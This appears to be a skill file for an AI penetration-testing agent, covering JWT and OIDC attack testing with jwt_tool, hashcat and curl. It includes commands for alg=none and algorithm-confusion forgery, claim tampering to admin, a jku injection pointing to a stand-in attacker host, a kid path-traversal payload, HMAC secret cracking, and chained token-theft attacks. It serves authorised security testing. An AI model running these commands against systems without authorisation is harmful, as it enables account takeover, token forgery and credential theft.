---
name: authentication-jwt
description: JWT and OIDC security testing covering token forgery, algorithm confusion, header injection (kid/jku/x5u/jwk), claim manipulation, and PKCE/state bypass
kali_tools: jwt_tool, curl, python3, hashcat
time:
  quick: 15m
  standard: 1h
  deep: 4h
github_fallbacks:
  jwt_tool: ticarpi/jwt_tool
---

# Authentication / JWT / OIDC

JWT/OIDC failures often enable token forgery, token confusion, cross-service acceptance, and durable account takeover. Do not trust headers, claims, or token opacity without strict validation bound to issuer, audience, key, and context.

## Before You Start (Memory)

Call `memory_recall_for_task` with queries like:
- "JWT algorithm confusion RS256 HS256"
- "JWT kid injection jku header abuse"
- "OIDC PKCE state nonce bypass"
- "JWT none algorithm acceptance"
- "past JWT authentication findings [target stack]"

Review recalled approaches — note any previously discovered JWKS endpoints or key material.

## Viability Gate

| Budget | Approach |
|--------|----------|
| < 15m  | Run jwt_tool attack matrix against the primary auth token: `jwt_tool <token> -M at -t <url> -rh "Authorization: Bearer <token>"`. Check for alg=none acceptance and RS256→HS256 confusion. |
| 15m–1h | Full header mutation (kid/jku/x5u/jwk), claim edits (iss/aud/exp/sub/roles), cross-service token replay, HMAC brute-force with hashcat if HS family detected. Cover OIDC flows for PKCE/state/nonce weaknesses. |
| 1h+    | Exhaustive: all token acceptance paths (gateway, service, worker, WebSocket, gRPC), JWKS cache race, refresh token reuse, mobile deep-link leakage, federation misconfigs. Build Actor × Audience × Service matrix. |

Hardware note: hashcat benefits from GPU for HMAC cracking. jwt_tool and curl are lightweight. If GPU unavailable, use CPU mode (`hashcat -D 1`) or a targeted wordlist.

## Tool Inventory

```bash
which jwt_tool curl python3 hashcat
```

Missing a tool? → `arcade_report_blocker("[tool] not installed for JWT testing")`

Or install from GitHub:
- `jwt_tool`: `git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip3 install -r requirements.txt` (ticarpi/jwt_tool)
  - Kali: `pip3 install jwt_tool` or clone from repo

Key jwt_tool commands:
```bash
# Full automated attack matrix
jwt_tool <token> -M at -t https://target/api/endpoint -rh "Authorization: Bearer <token>"

# Brute-force HMAC secret
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# Algorithm confusion: RS256 → HS256 with public key
jwt_tool <token> -X k -pk public.pem

# Inject jku header pointing to attacker JWKS
jwt_tool <token> -X s -ju 'https://attacker.tld/jwks.json'

# Tamper specific claim
jwt_tool <token> -I -pc role -pv admin

# None algorithm attack
jwt_tool <token> -X a
```

HMAC cracking with hashcat (when jwt_tool -C is too slow):
```bash
# Extract hash in hashcat format: header.payload:signature
hashcat -a 0 -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt
```

## Attack Surface

- Web/mobile/API authentication using JWT (JWS/JWE) and OIDC/OAuth2
- Access vs ID tokens, refresh tokens, device/PKCE/Backchannel flows
- First-party and microservices verification, gateways, and JWKS distribution

## Reconnaissance

### Endpoints

- Well-known: `/.well-known/openid-configuration`, `/oauth2/.well-known/openid-configuration`
- Keys: `/jwks.json`, rotating key endpoints, tenant-specific JWKS
- Auth: `/authorize`, `/token`, `/introspect`, `/revoke`, `/logout`, device code endpoints
- App: `/login`, `/callback`, `/refresh`, `/me`, `/session`, `/impersonate`

### Token Features

- Headers: `{"alg":"RS256","kid":"...","typ":"JWT","jku":"...","x5u":"...","jwk":{...}}`
- Claims: `{"iss":"...","aud":"...","azp":"...","sub":"user","scope":"...","exp":...,"nbf":...,"iat":...}`
- Formats: JWS (signed), JWE (encrypted). Note unencoded payload option (`"b64":false`) and critical headers (`"crit"`)

## Key Vulnerabilities

### Signature Verification

- RS256→HS256 confusion: change alg to HS256 and use the RSA public key as HMAC secret if algorithm is not pinned
- "none" algorithm acceptance: set `"alg":"none"` and drop the signature if libraries accept it
- ECDSA malleability/misuse: weak verification settings accepting non-canonical signatures

### Header Manipulation

- **kid injection**: path traversal `../../../../keys/prod.key`, SQL/command/template injection in key lookup, or pointing to world-readable files
- **jku/x5u abuse**: host attacker-controlled JWKS/X509 chain; if not pinned/whitelisted, server fetches and trusts attacker keys
- **jwk header injection**: embed attacker JWK in header; some libraries prefer inline JWK over server-configured keys
- **SSRF via remote key fetch**: exploit JWKS URL fetching to reach internal hosts

### Key and Cache Issues

- JWKS caching TTL and key rollover: accept obsolete keys; race rotation windows; missing kid pinning → accept any matching kty/alg
- Mixed environments: same secrets across dev/stage/prod; key reuse across tenants or services
- Fallbacks: verification succeeds when kid not found by trying all keys or no keys (implementation bugs)

### Claims Validation Gaps

- iss/aud/azp not enforced: cross-service token reuse; accept tokens from any issuer or wrong audience
- scope/roles fully trusted from token: server does not re-derive authorization; privilege inflation via claim edits when signature checks are weak
- exp/nbf/iat not enforced or large clock skew tolerance; accept long-expired or not-yet-valid tokens
- typ/cty not enforced: accept ID token where access token required (token confusion)

### Token Confusion and OIDC

- Access vs ID token swap: use ID token against APIs when they only verify signature but not audience/typ
- OIDC mix-up: redirect_uri and client mix-ups causing tokens for Client A to be redeemed at Client B
- PKCE downgrades: missing S256 requirement; accept plain or absent code_verifier
- State/nonce weaknesses: predictable or missing → CSRF/logical interception of login
- Device/Backchannel flows: codes and tokens accepted by unintended clients or services

### Refresh and Session

- Refresh token rotation not enforced: reuse old refresh token indefinitely; no reuse detection
- Long-lived JWTs with no revocation: persistent access post-logout
- Session fixation: bind new tokens to attacker-controlled session identifiers or cookies

### Transport and Storage

- Token in localStorage/sessionStorage: susceptible to XSS exfiltration; cookie vs header trade-offs with SameSite/CSRF
- Insecure CORS: wildcard origins with credentialed requests expose tokens and protected responses
- TLS and cookie flags: missing Secure/HttpOnly; lack of mTLS or DPoP/"cnf" binding permits replay from another device

## Advanced Techniques

### Microservices and Gateways

- Audience mismatch: internal services verify signature but ignore aud → accept tokens for other services
- Header trust: edge or gateway injects X-User-Id; backend trusts it over token claims
- Asynchronous consumers: workers process messages with bearer tokens but skip verification on replay

### JWS Edge Cases

- Unencoded payload (b64=false) with crit header: libraries mishandle verification paths
- Nested JWT (JWT-in-JWT) verification order errors; outer token accepted while inner claims ignored

## Special Contexts

### Mobile

- Deep-link/redirect handling bugs leak codes/tokens; insecure WebView bridges exposing tokens
- Token storage in plaintext files/SQLite/Keychain/SharedPrefs; backup/adb accessible

### SSO Federation

- Misconfigured trust between multiple IdPs/SPs, mixed metadata, or stale keys lead to acceptance of foreign tokens

## Chaining Attacks

- XSS → token theft → replay across services with weak audience checks
- SSRF → fetch private JWKS → sign tokens accepted by internal services
- Host header poisoning → OIDC redirect_uri poisoning → code capture
- IDOR in sessions/impersonation endpoints → mint tokens for other users

## Testing Methodology

1. **Inventory issuers/consumers** - Identity providers, API gateways, services, mobile/web clients
2. **Capture tokens** - Access and ID tokens for multiple roles; note header, claims, signature
3. **Map verification endpoints** - `/.well-known`, `/jwks.json`
4. **Build matrix** - Token Type × Audience × Service; attempt cross-use
5. **Mutate components** - Headers (alg, kid, jku/x5u/jwk), claims (iss/aud/azp/sub/exp), signatures
6. **Verify enforcement** - What is actually checked vs assumed

## Validation

1. Show forged or cross-context token acceptance (wrong alg, wrong audience/issuer, or attacker-signed JWKS)
2. Demonstrate access token vs ID token confusion at an API
3. Prove refresh token reuse without rotation detection or revocation
4. Confirm header abuse (kid/jku/x5u/jwk) leading to key selection under attacker control
5. Provide owner vs non-owner evidence with identical requests differing only in token context

## False Positives

- Token rejected due to strict audience/issuer enforcement
- Key pinning with JWKS whitelist and TLS validation
- Short-lived tokens with rotation and revocation on logout
- ID token not accepted by APIs that require access tokens

## Impact

- Account takeover and durable session persistence
- Privilege escalation via claim manipulation or cross-service acceptance
- Cross-tenant or cross-application data access
- Token minting by attacker-controlled keys or endpoints

## Pro Tips

1. Pin verification to issuer and audience; log and diff claim sets across services
2. Attempt RS256→HS256 and "none" first only if algorithm pinning is unclear; otherwise focus on header key control (kid/jku/x5u/jwk)
3. Test token reuse across all services; many backends only check signature, not audience/typ
4. Exploit JWKS caching and rotation races; try retired keys and missing kid fallbacks
5. Exercise OIDC flows with PKCE/state/nonce variants and mixed clients; look for mix-up
6. Try DPoP/mTLS absence to replay tokens from different devices
7. Treat refresh as its own surface: rotation, reuse detection, and audience scoping
8. Validate every acceptance path: gateway, service, worker, WebSocket, and gRPC
9. Favor minimal PoCs that clearly show cross-context acceptance and durable access
10. When in doubt, assume verification differs per stack (mobile vs web vs gateway) and test each

## Summary

Verification must bind the token to the correct issuer, audience, key, and client context on every acceptance path. Any missing binding enables forgery or confusion.

## After You Finish (Memory)

Call `memory_record_task_outcome` with:
```json
{
  "approach": "[which attack worked — alg confusion, none alg, kid injection, jku/x5u SSRF, claim edit, cross-service replay, PKCE bypass]",
  "learned": "[algorithm used by target, JWKS endpoint location, which claims were actually validated, HMAC secret if found]",
  "tools": "[jwt_tool command that succeeded, hashcat wordlist/mode, curl replay commands]"
}
```
